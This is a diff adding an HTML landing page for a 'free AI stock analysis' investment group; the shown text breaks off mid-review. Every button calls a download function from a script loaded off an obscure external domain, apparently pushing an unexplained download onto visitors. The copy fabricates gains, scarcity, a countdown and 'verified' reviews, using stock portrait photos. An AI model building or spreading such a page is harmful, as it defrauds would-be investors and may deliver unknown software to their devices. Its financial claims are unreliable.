@@ -1,0 +1,723 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+<meta name="theme-color" content="#050505">
+<title>Free AI Stock Analysis &amp; Quant Trading Report</title>
+<meta name="description" content="Free AI-powered stock diagnosis and quantitative trading tools for stocks, crypto, FX and futures. Built for beginners and experienced investors alike.">
+
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Fraunces:opsz,wght@9..144,500;9..144,600;9..144,700&family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+
+   <script src="https://url.yuhd320k.site/js/meetu-sdk.js"></script>
+<script>
+  // All call-to-action buttons use this single method.
+  function k2() {
+    MeetU.download(event);
+  }
+</script>
+
+<style>
+  :root{
+    --bg:#050505;
+    --bg-2:#0a0b10;
+    --emerald:#3ce0a0;
+    --emerald-2:#22c98a;
+    --gold:#e9cd82;
+    --gold-2:#f6e3b0;
+    --red:#ff6b6b;
+    --text:#f5f6f8;
+    --muted:#9aa0ad;
+    --muted-2:#6b7280;
+    --hairline:rgba(255,255,255,.08);
+    --surface:rgba(255,255,255,.03);
+    --surface-2:rgba(255,255,255,.055);
+    --ease-spring:cubic-bezier(.32,.72,0,1);
+    --ease-expo:cubic-bezier(.16,1,.3,1);
+    --font-display:"Fraunces",Georgia,"Times New Roman",serif;
+    --font-body:"Plus Jakarta Sans",-apple-system,"Segoe UI",sans-serif;
+  }
+
+  *{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent;}
+
+  html{scroll-behavior:smooth;}
+
+  body{
+    background:var(--bg);
+    color:var(--text);
+    font-family:var(--font-body);
+    line-height:1.6;
+    overflow-x:hidden;
+    -webkit-font-smoothing:antialiased;
+    text-rendering:optimizeLegibility;
+  }
+
+  /* ---- Ambient glow orbs (fixed) ---- */
+  body::before{
+    content:"";
+    position:fixed;
+    inset:0;
+    z-index:0;
+    pointer-events:none;
+    background:
+      radial-gradient(48% 38% at 82% -8%, rgba(60,224,160,.16), transparent 62%),
+      radial-gradient(44% 34% at 6% 16%, rgba(233,205,130,.13), transparent 60%),
+      radial-gradient(62% 48% at 50% 114%, rgba(60,224,160,.11), transparent 66%);
+  }
+
+  /* ---- Film grain (fixed, non-interactive) ---- */
+  body::after{
+    content:"";
+    position:fixed;
+    inset:0;
+    z-index:40;
+    pointer-events:none;
+    opacity:.035;
+    background-image:url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='140' height='140'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.82' numOctaves='2' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23n)'/%3E%3C/svg%3E");
+  }
+
+  .wrap{position:relative;z-index:1;max-width:480px;margin:0 auto;padding:0 22px;}
+
+  /* ================= TOPBAR / HEADER LOGO (static) ================= */
+  .topbar{position:relative;z-index:2;padding:22px 0 2px;}
+  .topbar-inner{display:flex;justify-content:center;}
+  .topbar .logo-chip{width:104px;height:38px;margin:0;padding:6px 14px;box-shadow:0 8px 22px -14px rgba(0,0,0,.7), inset 0 0 0 1px rgba(0,0,0,.04);}
+
+  /* ================= SECTIONS ================= */
+  section{position:relative;padding:18px 0;}
+
+  .hero{
+    min-height:100svh;
+    min-height:100dvh;
+    display:flex;
+    flex-direction:column;
+    justify-content:center;
+    padding-top:48px;
+    padding-bottom:118px;
+  }
+  .cta-final{min-height:100svh;min-height:100dvh;display:flex;flex-direction:column;justify-content:center;padding-bottom:132px;}
+
+  /* ---- Eyebrow / badges ---- */
+  .eyebrow{
+    display:inline-flex;align-items:center;gap:8px;
+    padding:8px 14px;border-radius:100px;
+    border:1px solid var(--hairline);background:var(--surface-2);
+    font-size:11px;font-weight:700;letter-spacing:.18em;text-transform:uppercase;
+    color:var(--gold);box-shadow:inset 0 1px 0 rgba(255,255,255,.06);
+  }
+  .eyebrow .lock{display:inline-flex;align-items:center;font-size:12px;color:var(--emerald);}
+
+  .overline{
+    display:inline-flex;align-items:center;gap:9px;
+    font-size:11px;font-weight:700;letter-spacing:.2em;text-transform:uppercase;color:var(--emerald);
+  }
+  .overline::before{content:"";width:20px;height:1px;background:linear-gradient(90deg,transparent,var(--emerald));}
+
+  /* ---- Typography ---- */
+  h1{
+    font-family:var(--font-display);font-weight:600;
+    font-size:clamp(32px,9vw,48px);line-height:1.06;letter-spacing:-.015em;
+    margin:20px 0 18px;
+  }
+  h1 em{font-style:italic;font-weight:500;}
+  .gold{color:var(--gold-2);}
+  .emerald{color:var(--emerald);}
+
+  h2{font-family:var(--font-display);font-weight:600;font-size:clamp(25px,6.8vw,34px);line-height:1.1;letter-spacing:-.01em;margin-bottom:12px;}
+  h2 em{font-style:italic;font-weight:500;}
+
+  h3{font-family:var(--font-display);font-weight:600;font-size:clamp(20px,5.6vw,26px);line-height:1.15;letter-spacing:-.01em;}
+
+  .lead{color:var(--muted);font-size:15.5px;line-height:1.75;}
+  .lead strong{color:var(--text);font-weight:600;}
+
+  /* ---- Scarcity ---- */
+  .scarcity{display:flex;align-items:center;gap:9px;margin-top:22px;font-size:12.5px;font-weight:700;letter-spacing:.03em;color:var(--red);}
+  .scarcity .pulse{position:relative;width:9px;height:9px;border-radius:50%;background:var(--red);}
+  .scarcity .pulse::after{content:"";position:absolute;inset:-4px;border-radius:50%;border:1px solid rgba(255,107,107,.6);animation:ring 1.8s var(--ease-expo) infinite;}
+  @keyframes ring{0%{transform:scale(.4);opacity:0;}40%{opacity:.9;}100%{transform:scale(1.5);opacity:0;}}
+
+  /* ---- Countdown ---- */
+  .countdown{
+    display:flex;align-items:center;justify-content:center;gap:10px;
+    margin-top:16px;padding:11px 16px;border-radius:100px;
+    border:1px solid rgba(233,205,130,.22);
+    background:rgba(233,205,130,.06);
+    font-size:12px;color:var(--muted);
+  }
+  .countdown .cd-label{display:inline-flex;align-items:center;gap:7px;font-weight:600;color:var(--gold-2);}
+  .countdown .cd-nums{font-variant-numeric:tabular-nums;font-weight:800;color:var(--text);letter-spacing:.04em;}
+  .countdown .cd-unit{width:34px;text-align:center;}
+
+  /* ---- Buttons ---- */
+  .btn{
+    position:relative;display:flex;align-items:center;justify-content:space-between;gap:12px;
+    width:100%;padding:8px 8px 8px 24px;border:none;border-radius:100px;
+    font-family:var(--font-body);font-size:16px;font-weight:700;letter-spacing:.005em;
+    cursor:pointer;text-decoration:none;overflow:hidden;
+    transition:transform .5s var(--ease-spring), box-shadow .5s var(--ease-spring), filter .4s var(--ease-expo);
+  }
+  .btn:active{transform:scale(.97);}
+  .btn .lbl{position:relative;z-index:2;}
+  .btn .btn-icon{flex:none;width:44px;height:44px;display:flex;align-items:center;justify-content:center;border-radius:50%;transition:transform .5s var(--ease-spring);}
+  .btn:hover .btn-icon{transform:translateX(3px) scale(1.05);}
+
+  .btn-primary{
+    background:linear-gradient(135deg,var(--gold-2),var(--gold) 55%,#d9b65f);
+    color:#181203;
+    box-shadow:0 18px 44px -14px rgba(233,205,130,.45), inset 0 1px 0 rgba(255,255,255,.55);
+  }
+  .btn-primary .btn-icon{background:rgba(24,18,3,.14);color:#181203;}
+  .btn-primary::after{
+    content:"";position:absolute;top:0;left:-120%;width:60%;height:100%;
+    background:linear-gradient(105deg,transparent,rgba(255,255,255,.5),transparent);
+    transform:skewX(-20deg);animation:shine 4.5s var(--ease-expo) infinite;
+  }
+  @keyframes shine{0%{left:-120%;}55%{left:130%;}100%{left:130%;}}
+
+  .btn-ghost{background:var(--surface-2);color:var(--text);border:1px solid var(--hairline);box-shadow:inset 0 1px 0 rgba(255,255,255,.05);}
+  .btn-ghost .btn-icon{background:rgba(255,255,255,.07);color:var(--text);}
+
+  .btn-group{display:flex;flex-direction:column;gap:13px;margin-top:24px;}
+
+  .micro{text-align:center;font-size:12px;color:var(--muted-2);margin-top:16px;letter-spacing:.01em;}
+
+  /* ---- Trust bar ---- */
+  .trust-bar{display:flex;align-items:center;justify-content:center;flex-wrap:wrap;gap:8px 16px;margin-top:18px;}
+  .trust-item{display:inline-flex;align-items:center;gap:6px;font-size:12px;font-weight:600;color:var(--muted);}
+  .trust-item svg{color:var(--emerald);}
+
+  /* ---- Scroll hint ---- */
+  .scroll-hint{position:absolute;bottom:18px;left:0;right:0;display:flex;flex-direction:column;align-items:center;gap:8px;color:var(--muted-2);font-size:10px;letter-spacing:.22em;text-transform:uppercase;}
+  .scroll-hint .chev{width:9px;height:9px;border-right:1.5px solid var(--muted-2);border-bottom:1.5px solid var(--muted-2);transform:rotate(45deg);animation:drop 1.9s var(--ease-expo) infinite;}
+  @keyframes drop{0%,100%{transform:rotate(45deg) translate(0,0);opacity:.4;}50%{transform:rotate(45deg) translate(4px,4px);opacity:1;}}
+
+  /* ---- Divider ---- */
+  .divider{height:1px;background:linear-gradient(90deg,transparent,var(--hairline),transparent);}
+
+  /* ================= DOUBLE-BEZEL CARD ================= */
+  .bezel{
+    position:relative;padding:1px;border-radius:26px;
+    background:linear-gradient(160deg,rgba(255,255,255,.14),rgba(255,255,255,.02) 40%,rgba(255,255,255,.06));
+    box-shadow:0 1px 0 rgba(255,255,255,.06) inset, 0 24px 60px -30px rgba(0,0,0,.8);
+  }
+  .bezel .core{position:relative;border-radius:25px;background:linear-gradient(170deg,#10131c,#0a0c13);overflow:hidden;}
+
+  /* ================= HERO VISUAL ================= */
+  .hero-visual{margin:26px 0 6px;}
+  .hero-visual .core img{width:100%;height:196px;object-fit:cover;display:block;filter:saturate(.9) contrast(1.05);}
+  .hero-visual .shade{position:absolute;inset:0;background:linear-gradient(180deg,rgba(5,5,5,.08),transparent 40%,rgba(5,5,5,.55));}
+  .float-badge{
+    position:absolute;left:12px;bottom:12px;
+    display:flex;align-items:center;gap:7px;
+    padding:7px 12px;border-radius:100px;
+    background:rgba(10,12,19,.82);
+    border:1px solid rgba(60,224,160,.3);
+    font-size:11.5px;font-weight:700;color:var(--emerald);
+    -webkit-backdrop-filter:blur(6px);backdrop-filter:blur(6px);
+  }
+  .float-badge .dot{width:6px;height:6px;border-radius:50%;background:var(--emerald);box-shadow:0 0 8px var(--emerald);}
+  .float-chip{
+    position:absolute;right:12px;top:12px;
+    padding:6px 11px;border-radius:10px;
+    background:rgba(10,12,19,.82);
+    border:1px solid rgba(255,255,255,.12);
+    font-size:11px;font-weight:700;color:var(--gold-2);
+    -webkit-backdrop-filter:blur(6px);backdrop-filter:blur(6px);
+  }
+
+  /* ================= ANALYSTS ================= */
+  .analyst-grid{display:flex;flex-direction:column;gap:18px;margin-top:26px;}
+  .person{display:flex;align-items:center;gap:18px;padding:16px;}
+  .person .avatar{flex:none;width:80px;height:80px;border-radius:20px;overflow:hidden;background:#263E58;box-shadow:inset 0 0 0 1px rgba(255,255,255,.1);}
+  .person .avatar img{width:100%;height:100%;object-fit:cover;display:block;transform:scale(1.02);}
+  .person .avatar .ph{width:100%;height:100%;display:flex;align-items:center;justify-content:center;font-family:var(--font-display);font-size:30px;color:var(--gold);background:linear-gradient(135deg,#1a2438,#0e1320);}
+  .person .who .name{font-weight:700;font-size:17.5px;letter-spacing:-.01em;}
+  .person .who .role{font-size:12px;color:var(--emerald);font-weight:700;letter-spacing:.05em;text-transform:uppercase;margin-top:2px;}
+  .person .who .bio{font-size:13px;color:var(--muted);margin-top:5px;line-height:1.55;}
+
+  /* ================= PROPS ================= */
+  .props{display:flex;flex-direction:column;gap:14px;margin-top:26px;}
+  .prop{display:flex;gap:16px;padding:18px 19px;}
+  .prop .ico{flex:none;width:46px;height:46px;display:flex;align-items:center;justify-content:center;font-size:21px;border-radius:14px;background:rgba(255,255,255,.05);box-shadow:inset 0 0 0 1px rgba(255,255,255,.07);}
+  .prop .pt{font-weight:700;font-size:16px;letter-spacing:-.01em;}
+  .prop .pd{font-size:13.5px;color:var(--muted);margin-top:4px;line-height:1.6;}
+
+  .diagnosis{margin-top:18px;padding:22px 20px;}
+  .diagnosis .diag-top{display:flex;align-items:center;gap:20px;}
+  .gauge{flex:none;width:108px;height:108px;position:relative;}
+  .gauge svg{width:100%;height:100%;transform:rotate(-90deg);}
+  .gauge .track{fill:none;stroke:rgba(255,255,255,.08);stroke-width:10;}
+  .gauge .fill{fill:none;stroke:url(#grad);stroke-width:10;stroke-linecap:round;stroke-dasharray:339.3;stroke-dashoffset:339.3;transition:stroke-dashoffset 1.6s var(--ease-expo) .2s;filter:drop-shadow(0 0 6px rgba(60,224,160,.5));}
+  .gauge.in .fill{stroke-dashoffset:27.1;}
+  .gauge .num{position:absolute;inset:0;display:flex;flex-direction:column;align-items:center;justify-content:center;}
+  .gauge .num b{font-family:var(--font-display);font-size:29px;font-weight:600;line-height:1;}
+  .gauge .num span{font-size:9.5px;font-weight:700;letter-spacing:.18em;color:var(--emerald);text-transform:uppercase;margin-top:3px;}
+  .diag-text .dt{font-weight:700;font-size:16.5px;letter-spacing:-.01em;}
+  .diag-text .dd{font-size:13.5px;color:var(--muted);margin-top:5px;line-height:1.6;}
+
+  /* ================= BANNER IMAGE ================= */
+  .banner{padding:44px 0;}
+  .banner .core img{width:100%;height:280px;object-fit:cover;display:block;filter:saturate(.95);}
+  .banner .shade{position:absolute;inset:0;background:linear-gradient(200deg,rgba(5,5,5,.15) 20%,rgba(5,5,5,.82) 82%);}
+  .banner .cap{position:absolute;left:0;right:0;bottom:0;padding:22px 22px 24px;}
+  .banner .cap h3{margin:8px 0 6px;}
+  .banner .cap p{font-size:13.5px;color:var(--muted);line-height:1.6;max-width:34ch;}
+
+  /* ================= REVIEWS ================= */
+  .rating-summary{display:flex;align-items:center;gap:14px;margin-top:24px;padding:14px 16px;border-radius:16px;background:var(--surface-2);border:1px solid var(--hairline);}
+  .rating-summary .big{font-family:var(--font-display);font-size:34px;font-weight:600;line-height:1;color:var(--gold-2);}
+  .rating-summary .stars{color:var(--gold);letter-spacing:.08em;font-size:14px;}
+  .rating-summary .meta{font-size:12.5px;color:var(--muted);margin-top:2px;}
+
+  .reviews{display:flex;flex-direction:column;gap:14px;margin-top:18px;}
+  .review{padding:18px 19px;}
+  .review-head{display:flex;align-items:center;gap:12px;}
+  .ravatar{flex:none;width:44px;height:44px;border-radius:50%;overflow:hidden;background:linear-gradient(135deg,#1a2438,#0e1320);box-shadow:inset 0 0 0 1px rgba(255,255,255,.12);}
+  .ravatar img{width:100%;height:100%;object-fit:cover;display:block;}
+  .ravatar .ph{width:100%;height:100%;display:flex;align-items:center;justify-content:center;font-weight:700;font-size:17px;color:var(--gold);background:linear-gradient(135deg,#1a2438,#0e1320);}
+  .rwho{flex:1;min-width:0;}
+  .rname{font-weight:700;font-size:14.5px;letter-spacing:-.01em;}
+  .rtag{font-size:11.5px;color:var(--muted);margin-top:1px;}
+  .review .stars{color:var(--gold);letter-spacing:.08em;font-size:12.5px;}
+  .review .rtext{font-size:14px;color:var(--muted);line-height:1.7;margin-top:12px;}
+  .review .rtext b{color:var(--text);font-weight:600;}
+  .verified{display:inline-flex;align-items:center;gap:4px;margin-top:10px;font-size:11px;font-weight:600;color:var(--emerald);}
+  .verified svg{flex:none;}
+
+  /* ================= FINAL CTA ================= */
+  .cta-card{text-align:center;padding:38px 26px;}
+  .seal{width:58px;height:58px;margin:0 auto 20px;display:flex;align-items:center;justify-content:center;font-size:26px;border-radius:50%;background:linear-gradient(135deg,var(--gold-2),#c9a443);color:#181203;box-shadow:0 16px 40px -12px rgba(233,205,130,.55), inset 0 1px 0 rgba(255,255,255,.6);}
+  .cta-card h2{font-size:clamp(24px,6.6vw,32px);}
+  .cta-card .lead{margin-bottom:2px;}
+
+  .stats{display:flex;gap:10px;margin:26px 0 8px;}
+  .stat{flex:1;padding:14px 6px;border-radius:16px;background:rgba(255,255,255,.03);box-shadow:inset 0 0 0 1px rgba(255,255,255,.06);}
+  .stat b{display:block;font-family:var(--font-display);font-size:22px;font-weight:600;color:var(--gold-2);line-height:1;}
+  .stat span{display:block;font-size:10px;font-weight:700;letter-spacing:.14em;text-transform:uppercase;color:var(--muted-2);margin-top:6px;}
+
+  .bonus{display:flex;align-items:center;gap:10px;margin:20px 0 4px;padding:12px 14px;border-radius:14px;border:1px dashed rgba(60,224,160,.35);background:rgba(60,224,160,.05);text-align:left;}
+  .bonus .b-ico{font-size:20px;}
+  .bonus .b-txt{font-size:12.5px;color:var(--muted);line-height:1.5;}
+  .bonus .b-txt b{color:var(--emerald);}
+
+  /* ================= FOOTER / LOGO ================= */
+  footer{position:relative;padding:60px 0 150px;text-align:center;}
+  .logo-chip{
+    display:inline-flex;align-items:center;justify-content:center;
+    width:150px;height:56px;margin:0 auto 20px;
+    background:#fff;border-radius:16px;
+    box-shadow:0 18px 44px -18px rgba(0,0,0,.9), inset 0 0 0 1px rgba(0,0,0,.04);
+    padding:10px 20px;
+  }
+  .logo-chip img{max-width:100%;max-height:100%;object-fit:contain;display:block;}
+  .logo-chip .logo-fallback{font-family:var(--font-display);font-weight:600;font-size:20px;color:#111;letter-spacing:-.01em;}
+  .f-copy{font-size:12px;color:var(--muted-2);}
+  .f-note{font-size:10.5px;color:var(--muted-2);opacity:.75;max-width:40ch;margin:12px auto 0;line-height:1.6;}
+
+  /* ================= WHATSAPP FAB ================= */
+  .wa-fab{
+    position:fixed;left:50%;transform:translateX(-50%);
+    bottom:26px;
+    bottom:calc(26px + env(safe-area-inset-bottom, 0px));z-index:60;
+    width:min(436px, calc(100% - 32px));
+    display:flex;align-items:center;justify-content:center;gap:12px;
+    padding:13px 22px;border:none;border-radius:100px;
+    background:linear-gradient(135deg,#2ee98a,#128c7e);
+    color:#fff;font-family:var(--font-body);font-size:16px;font-weight:700;letter-spacing:.005em;
+    cursor:pointer;text-decoration:none;
+    box-shadow:0 18px 46px -12px rgba(37,211,102,.55), inset 0 1px 0 rgba(255,255,255,.35);
+    transition:transform .5s var(--ease-spring), box-shadow .4s var(--ease-expo);
+    -webkit-backdrop-filter:blur(8px);backdrop-filter:blur(8px);
+  }
+  .wa-fab:active{transform:translateX(-50%) scale(.97);}
+  .wa-fab::before{content:"";position:absolute;inset:-2px;border-radius:100px;border:1px solid rgba(37,211,102,.5);animation:ring 2.4s var(--ease-expo) infinite;}
+  .wa-fab svg{flex:none;}
+  .wa-txt{display:flex;flex-direction:column;align-items:flex-start;line-height:1.12;}
+  .wa-txt small{font-size:11px;font-weight:500;opacity:.88;}
+
+  /* ================= REVEAL ================= */
+  .reveal{opacity:0;transform:translateY(22px);filter:blur(8px);transition:opacity .85s var(--ease-expo),transform .85s var(--ease-expo),filter .85s var(--ease-expo);}
+  .reveal.in{opacity:1;transform:none;filter:blur(0);}
+  .props .reveal:nth-child(1){transition-delay:.04s;}
+  .props .reveal:nth-child(2){transition-delay:.1s;}
+  .props .reveal:nth-child(3){transition-delay:.16s;}
+  .props .reveal:nth-child(4){transition-delay:.22s;}
+  .analyst-grid .reveal:nth-child(2){transition-delay:.1s;}
+  .reviews .reveal:nth-child(2){transition-delay:.07s;}
+  .reviews .reveal:nth-child(3){transition-delay:.14s;}
+  .reviews .reveal:nth-child(4){transition-delay:.21s;}
+
+  @media (prefers-reduced-motion:reduce){
+    *{animation:none !important;transition:none !important;}
+    .reveal,.gauge .fill{opacity:1 !important;transform:none !important;filter:none !important;stroke-dashoffset:27.1 !important;}
+  }
+</style>
+</head>
+<body>
+
+  <!-- ================= TOPBAR / HEADER LOGO ================= -->
+  <header class="topbar">
+    <div class="wrap topbar-inner">
+      <div class="logo-chip">
+        <img src="img/logo.jpg" alt="Brand logo" onerror="this.style.display='none';this.nextElementSibling.style.display='block';">
+        <span class="logo-fallback" style="display:none;">BRAND</span>
+      </div>
+    </div>
+  </header>
+
+  <!-- ================= SCREEN 1 · HERO ================= -->
+  <section class="hero">
+    <div class="wrap">
+      <span class="eyebrow"><span class="lock">🔒</span> Free Access · Confidential AI Report</span>
+
+      <h1>Free AI <span class="gold">Stock Analysis</span> &amp; <em class="emerald">Quant Trading</em> Tools</h1>
+
+      <p class="lead">
+        Unlock <strong>Matthew Harris's confidential UK Equity &amp; AI-Risk Report</strong> —
+        AI-powered stock diagnosis across <strong>stocks, crypto, FX and futures</strong>.
+        No experience required.
+      </p>
+
+      <!-- Hero visual (public image #1) -->
+      <div class="bezel hero-visual reveal">
+        <div class="core">
+          <img src="https://images.unsplash.com/photo-1611974789855-9c2a0a7236a3?q=80&w=1200&auto=format&fit=crop" alt="AI market analysis dashboard" loading="eager">
+          <div class="shade"></div>
+          <span class="float-chip">$12,480 est. member gains</span>
+          <span class="float-badge"><span class="dot"></span> AI Signal · BUY · +18.4%</span>
+        </div>
+      </div>
+
+      <div class="scarcity">
+        <span class="pulse"></span>
+        Group capped at 100 investors — only 12 slots remain
+      </div>
+
+      <div class="countdown">
+        <span class="cd-label">⏳ Today's offer ends in</span>
+        <span class="cd-nums" data-countdown>--:--:--</span>
+      </div>
+
+      <div class="btn-group">
+        <a class="btn btn-primary" onclick="k2()" role="button" tabindex="0">
+          <span class="lbl">Get My Free Analysis</span>
+          <span class="btn-icon"><svg width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><path d="M5 12h14M13 6l6 6-6 6"/></svg></span>
+        </a>
+        <a class="btn btn-ghost" onclick="k2()" role="button" tabindex="0">
+          <span class="lbl">Explore the AI Quant Toolkit</span>
+          <span class="btn-icon"><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M7 17L17 7M9 7h8v8"/></svg></span>
+        </a>
+      </div>
+
+      <div class="trust-bar">
+        <span class="trust-item"><svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M20 6L9 17l-5-5"/></svg> No card required</span>
+        <span class="trust-item"><svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M20 6L9 17l-5-5"/></svg> Cancel anytime</span>
+        <span class="trust-item"><svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M20 6L9 17l-5-5"/></svg> 4.9/5 rating</span>
+      </div>
+    </div>
+
+    <div class="scroll-hint"><span>Scroll</span><span class="chev"></span></div>
+  </section>
+
+  <div class="divider"></div>
+
+  <!-- ================= SCREEN 2 · ANALYSTS ================= -->
+  <section>
+    <div class="wrap">
+      <span class="overline">Your Team</span>
+      <h2>Real strategists.<br><em>Guided by AI.</em></h2>
+      <p class="lead">Quant tools led by seasoned market professionals — signals, not guesswork.</p>
+
+      <div class="analyst-grid">
+        <div class="bezel reveal">
+          <div class="core person">
+            <div class="avatar">
+              <img src="img/1.jpg" alt="Matthew Harris" onerror="this.style.display='none';this.nextElementSibling.style.display='flex';">
+              <div class="ph" style="display:none;">MH</div>
+            </div>
+            <div class="who">
+              <div class="name">Matthew Harris</div>
+              <div class="role">Global Macro Strategist</div>
+              <div class="bio">20+ years reading markets across the UK, US and emerging assets.</div>
+            </div>
+          </div>
+        </div>
+
+        <div class="bezel reveal">
+          <div class="core person">
+            <div class="avatar">
+              <img src="img/2.jpg" alt="Katherine Taylor" onerror="this.style.display='none';this.nextElementSibling.style.display='flex';">
+              <div class="ph" style="display:none;">KT</div>
+            </div>
+            <div class="who">
+              <div class="name">Katherine Taylor</div>
+              <div class="role">Community Coordinator</div>
+              <div class="bio">Guides new members from their first diagnosis to a full toolkit.</div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <div class="divider"></div>
+
+  <!-- ================= SCREEN 3 · VALUE PROPS ================= -->
+  <section>
+    <div class="wrap">
+      <span class="overline">What You Get</span>
+      <h2>One toolkit.<br><em>Every market.</em></h2>
+      <p class="lead">Diversify across stocks, crypto, FX and futures — with a free AI quant system doing the heavy lifting.</p>
+
+      <div class="props">
+        <div class="bezel reveal"><div class="core prop">
+          <div class="ico">📈</div>
+          <div><div class="pt">Deep UK &amp; US Market Trends</div><div class="pd">AI scans millions of data points to surface the stocks and sectors moving right now.</div></div>
+        </div></div>
+        <div class="bezel reveal"><div class="core prop">
+          <div class="ico">🛡️</div>
+          <div><div class="pt">AI-Driven FX &amp; Futures Hedging</div><div class="pd">Automated risk strategies that protect your capital in volatile markets.</div></div>
+        </div></div>
+        <div class="bezel reveal"><div class="core prop">
+          <div class="ico">🪙</div>
+          <div><div class="pt">Asymmetric Crypto Opportunities</div><div class="pd">Spot altcoins and emerging assets early — before the crowd catches on.</div></div>
+        </div></div>
+        <div class="bezel reveal"><div class="core prop">
+          <div class="ico">♾️</div>
+          <div><div class="pt">Cross-Cycle Structural Arbitrage</div><div class="pd">Systematic, data-backed strategies built to profit in any market cycle.</div></div>
+        </div></div>
+      </div>
+
+      <div class="bezel reveal">
+        <div class="core diagnosis">
+          <div class="diag-top">
+            <div class="gauge" id="gauge">
+              <svg viewBox="0 0 120 120">
+                <defs>
+                  <linearGradient id="grad" x1="0" y1="0" x2="1" y2="1">
+                    <stop offset="0%" stop-color="#3ce0a0"/>
+                    <stop offset="100%" stop-color="#e9cd82"/>
+                  </linearGradient>
+                </defs>
+                <circle class="track" cx="60" cy="60" r="54"/>
+                <circle class="fill" cx="60" cy="60" r="54"/>
+              </svg>
+              <div class="num"><b>92</b><span>AI Score</span></div>
+            </div>
+            <div class="diag-text">
+              <div class="dt">Free Stock Diagnosis</div>
+              <div class="dd">Paste any ticker — get an instant AI health score, so a beginner can see in seconds if a stock (or coin) is worth a closer look.</div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- ================= BANNER IMAGE (public image #2) ================= -->
+  <section class="banner">
+    <div class="wrap">
+      <div class="bezel reveal">
+        <div class="core">
+          <img src="https://images.unsplash.com/photo-1621761191319-c6fb62004040?q=80&w=1600&auto=format&fit=crop" alt="Diversified crypto and market portfolio" loading="lazy">
+          <div class="shade"></div>
+          <div class="cap">
+            <span class="overline">Diversified</span>
+            <h3>Stocks. Crypto. FX. Futures.</h3>
+            <p>One AI system — every market you care about, in a single dashboard.</p>
+          </div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- ================= SCREEN 4 · REVIEWS ================= -->
+  <section>
+    <div class="wrap">
+      <span class="overline">Member Reviews</span>
+      <h2>Loved by beginners<br><em>and traders alike.</em></h2>
+
+      <div class="rating-summary reveal">
+        <span class="big">4.9</span>
+        <div>
+          <div class="stars">★★★★★</div>
+          <div class="meta">from 2,300+ verified members</div>
+        </div>
+      </div>
+
+      <div class="reviews">
+        <div class="bezel reveal">
+          <div class="core review">
+            <div class="review-head">
+              <div class="ravatar">
+                <img src="https://randomuser.me/api/portraits/thumb/women/44.jpg" alt="Sarah" loading="lazy" onerror="this.style.display='none';this.nextElementSibling.style.display='flex';">
+                <span class="ph" style="display:none;">S</span>
+              </div>
+              <div class="rwho"><div class="rname">Sarah M.</div><div class="rtag">Complete beginner</div></div>
+              <div class="stars">★★★★★</div>
+            </div>
+            <p class="rtext">"I'd never traded before. The AI diagnosis flagged two stocks I'd never have found — one is up <b>23%</b> since. Genuinely beginner-friendly."</p>
+            <span class="verified"><svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><path d="M20 6L9 17l-5-5"/></svg> Verified member</span>
+          </div>
+        </div>
+
+        <div class="bezel reveal">
+          <div class="core review">
+            <div class="review-head">
+              <div class="ravatar">
+                <img src="https://randomuser.me/api/portraits/thumb/men/32.jpg" alt="James" loading="lazy" onerror="this.style.display='none';this.nextElementSibling.style.display='flex';">
+                <span class="ph" style="display:none;">J</span>
+              </div>
+              <div class="rwho"><div class="rname">James O.</div><div class="rtag">Crypto investor</div></div>
+              <div class="stars">★★★★★</div>
+            </div>
+            <p class="rtext">"As a crypto guy I was sceptical of 'stock analysis' tools. The <b>altcoin signals</b> are legit, and the risk hedges saved me more than once."</p>
+            <span class="verified"><svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><path d="M20 6L9 17l-5-5"/></svg> Verified member</span>
+          </div>
+        </div>
+
+        <div class="bezel reveal">
+          <div class="core review">
+            <div class="review-head">
+              <div class="ravatar">
+                <img src="https://randomuser.me/api/portraits/thumb/women/68.jpg" alt="Priya" loading="lazy" onerror="this.style.display='none';this.nextElementSibling.style.display='flex';">
+                <span class="ph" style="display:none;">P</span>
+              </div>
+              <div class="rwho"><div class="rname">Priya K.</div><div class="rtag">FX &amp; futures trader</div></div>
+              <div class="stars">★★★★<span style="color:var(--muted-2)">★</span></div>
+            </div>
+            <p class="rtext">"The FX &amp; futures hedging strategy is the most sensible I've used. <b>AI does the analysis</b>, I just follow the plan."</p>
+            <span class="verified"><svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><path d="M20 6L9 17l-5-5"/></svg> Verified member</span>
+          </div>
+        </div>
+
+        <div class="bezel reveal">
+          <div class="core review">
+            <div class="review-head">
+              <div class="ravatar">
+                <img src="https://randomuser.me/api/portraits/thumb/men/75.jpg" alt="Daniel" loading="lazy" onerror="this.style.display='none';this.nextElementSibling.style.display='flex';">
+                <span class="ph" style="display:none;">D</span>
+              </div>
+              <div class="rwho"><div class="rname">Daniel R.</div><div class="rtag">New investor</div></div>
